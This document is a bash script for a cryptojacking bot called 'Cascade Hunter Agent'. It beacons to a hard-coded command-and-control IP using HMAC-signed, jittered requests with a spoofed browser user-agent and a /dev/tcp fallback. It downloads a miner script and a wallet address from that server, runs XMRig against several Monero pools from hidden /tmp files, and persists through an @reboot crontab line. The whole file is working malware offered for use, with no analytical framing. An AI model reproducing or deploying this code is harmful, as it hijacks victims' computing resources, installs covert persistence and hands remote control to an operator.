#!/bin/bash
# Cascade Hunter Agent v2.0 (TLS + HMAC + Jitter support)
# Auto-deploy miner with persistence and wallet rotation awareness

C2_HOST="${C2_HOST:-151.240.157.27}"
C2_PORT="${C2_PORT:-9002}"
C2_SCHEME="${C2_SCHEME:-http}"
BEACON_PREFIX="${BEACON_PREFIX:-vieta9}"
HMAC_SECRET="${HMAC_SECRET:-b089e80c95aed05fba2b8b76e7ad7e1c62ffb72adcb25d09d3ee160c52518dfa}"
BEACON_JITTER="${BEACON_JITTER:-30}"
# Pool specs: host:port[:user[:pass]] , comma-separated. A deploy can override
# this (C2_POOLS env) so the pool actually used is the one the operator asked for.
C2_POOLS="${C2_POOLS:-pool.supportxmr.com:3333,xmr.2miners.com:2222,moneroocean.stream:10001,pool.hashvault.pro:3333,xmrpool.eu:3333,monero.herominers.com:10191}"
CRON_TAG="# cascade-hunter-agent"

bot_id="hunter_$(cat /proc/sys/kernel/hostname 2>/dev/null | md5sum | cut -c1-12)_$(id -u)"
MINER_SCRIPT="/tmp/.cascade_mine.sh"
MINER_BIN="/tmp/.cache/xmrig"
PID_FILE="/tmp/.cascade_mine.pid"

# Build the XMRig -o/-u/-p argument string from C2_POOLS (credentials included).
pool_cli_args() {
    local wallet="$1" out="" spec host port user pass rest
    local oldifs="$IFS"; IFS=','
    for spec in $C2_POOLS; do
        IFS="$oldifs"
        spec="$(printf '%s' "$spec" | tr -d '[:space:]')"
        if [ -n "$spec" ]; then
            host="${spec%%:*}"; spec="${spec#*:}"
            port="${spec%%:*}"; spec="${spec#*:}"
            if [ -z "$spec" ]; then
                user="$wallet"; pass="worker"
            else
                user="${spec%%:*}"; rest="${spec#*:}"
                if [ "$rest" = "$user" ]; then pass="worker"; else pass="$rest"; fi
                [ -z "$user" ] && user="$wallet"
                [ -z "$pass" ] && pass="worker"
            fi
            out="$out -o "$host:$port" -u "$user" -p "$pass""
        fi
        IFS=','
    done
    IFS="$oldifs"
    printf '%s' "$out"
}

# Is the miner actually RUNNING (not merely dispatched)?
mining_state() {
    local mining="0" pid="" cpu="0"
    if [ -f "$PID_FILE" ]; then
        pid="$(cat "$PID_FILE" 2>/dev/null)"
        if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
            mining="1"
            cpu="$(ps -o %cpu= -p "$pid" 2>/dev/null | tr -d ' ' | cut -d. -f1)"
            [ -z "$cpu" ] && cpu="0"
        fi
    fi
    printf '{"mining":"%s","pid":"%s","cpu":"%s","pool":"%s","ts":"%s"}'         "$mining" "$pid" "$cpu" "${C2_POOLS%%,*}" "$(date +%s 2>/dev/null)"
}

# v2.2: persistence edits ONLY a marked line. The old code piped the whole
# crontab back in, replacing it entirely (wiping unrelated host jobs).
install_cron() {
    local wallet="$1" line
    line="@reboot bash $MINER_SCRIPT $wallet $CRON_TAG"
    ( crontab -l 2>/dev/null | grep -v -F "$CRON_TAG"; printf '%s
' "$line" ) | crontab - 2>/dev/null
}
remove_cron() {
    crontab -l 2>/dev/null | grep -v -F "$CRON_TAG" | crontab - 2>/dev/null
}

beacon_sig() {
    local payload="$1"
    if [[ -n "$HMAC_SECRET" ]]; then
        echo -n "$payload" | openssl dgst -sha256 -hmac "$HMAC_SECRET" | awk '{print $2}'
    fi
}

# base64url-encode the JSON info blob so it survives the query string and the
# HMAC stays valid (the C2 signs the received value, which is this encoded form).
b64url() {
    printf '%s' "$1" | base64 | tr -d '
' | tr '+/' '-_'
}

beacon() {
    local event="$1"
    local info="$2"
    local info_enc="$info"
    if [[ -n "$info" ]]; then
        info_enc=$(b64url "$info")
    fi
    local sig=$(beacon_sig "$bot_id:$event:$info_enc")
    if [[ -n "$BEACON_JITTER" && "$BEACON_JITTER" -gt 0 ]]; then
        sleep $((RANDOM % BEACON_JITTER))
    fi
    local url="$C2_SCHEME://$C2_HOST:$C2_PORT/${BEACON_PREFIX}beacon?id=$bot_id&n=$event&i=$info_enc&sig=$sig"
    if command -v curl &>/dev/null; then
        curl -sf --max-time 5 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0" "$url" 2>/dev/null
    elif command -v wget &>/dev/null; then
        wget -q -O - --timeout=5 --user-agent="Mozilla/5.0" "$url" 2>/dev/null
    else
        if [[ -e /dev/tcp/$C2_HOST/$C2_PORT ]]; then
            exec 3<>/dev/tcp/$C2_HOST/$C2_PORT
            echo -e "GET /${BEACON_PREFIX}beacon?id=$bot_id&n=$event&i=$info_enc&sig=$sig HTTP/1.0\r\nHost: $C2_HOST:$C2_PORT\r\n\r\n" >&3
            cat >&3
            exec 3>&-
        fi
    fi
}

fetch_wallet() {
    local url="$C2_SCHEME://$C2_HOST:$C2_PORT/wallet"
    if command -v curl &>/dev/null; then
        curl -sf --max-time 5 "$url" 2>/dev/null | grep -o '"active_address":"[^"]*"' | cut -d'"' -f4
    elif command -v wget &>/dev/null; then
        wget -q -O - --timeout=5 "$url" 2>/dev/null | grep -o '"active_address":"[^"]*"' | cut -d'"' -f4
    fi
}

deploy_miner() {
    local wallet="${1:-$(fetch_wallet)}"
    if [[ -z "$wallet" ]]; then
        echo "[!] No wallet available from C2" >&2
        return 1
    fi
    local miner_url="$C2_SCHEME://$C2_HOST:$C2_PORT/miner"
    if command -v curl &>/dev/null; then
        curl -sfL --max-time 10 "$miner_url" -o "$MINER_SCRIPT" 2>/dev/null
    elif command -v wget &>/dev/null; then
        wget -q -O "$MINER_SCRIPT" --timeout=10 "$miner_url" 2>/dev/null
    fi
    if [[ ! -f "$MINER_SCRIPT" ]]; then
        echo "[!] Failed to fetch miner script" >&2
        return 1
    fi
    chmod +x "$MINER_SCRIPT"
    # Pass the resolved pool specs through so the deploy's pool (C2_POOLS) is what
    # the miner actually dials, not just the value baked in at fetch time.
    WALLET="$wallet" POOL_SPECS="$C2_POOLS" nohup bash "$MINER_SCRIPT" "$wallet" >/dev/null 2>&1 &
    echo $! > "$PID_FILE"
    install_cron "$wallet"
    echo "[+] Miner deployed with wallet: ${wallet:0:12}..."
    return 0
}

run() {
    beacon "startup" "$(mining_state)"
    if deploy_miner; then
        sleep 5
        # Report EXECUTION, not dispatch: 'mining' is only sent once the miner
        # process is alive, so the C2 banner/file reflect a real running miner.
        if [[ "$(mining_state)" == *'"mining":"1"'* ]]; then
            beacon "mining" "$(mining_state)"
        else
            beacon "heartbeat" "$(mining_state)"
        fi
    fi
    while true; do
        if [[ "$(mining_state)" == *'"mining":"1"'* ]]; then
            beacon "mining" "$(mining_state)"
        else
            beacon "heartbeat" "$(mining_state)"
        fi
        interval=$((60 + RANDOM % 120 + RANDOM % BEACON_JITTER))
        sleep $interval
    done
}

case "${1:-run}" in
    run) run ;;
    mine) deploy_miner "$2" ;;
    wallet) fetch_wallet ;;
    stop)
        if [[ -f "$PID_FILE" ]]; then
            kill $(cat "$PID_FILE") 2>/dev/null
            rm -f "$PID_FILE" "$MINER_SCRIPT" "$MINER_BIN"
            echo "[+] Hunter stopped and cleaned up"
        fi
        # Always drop OUR marked cron line, even if the pid file is already gone
        # (a reboot before 'stop', a manual rm, ...). Only the marked line is
        # removed; the wipe-everything cron form is never used.
        remove_cron
        ;;
esac
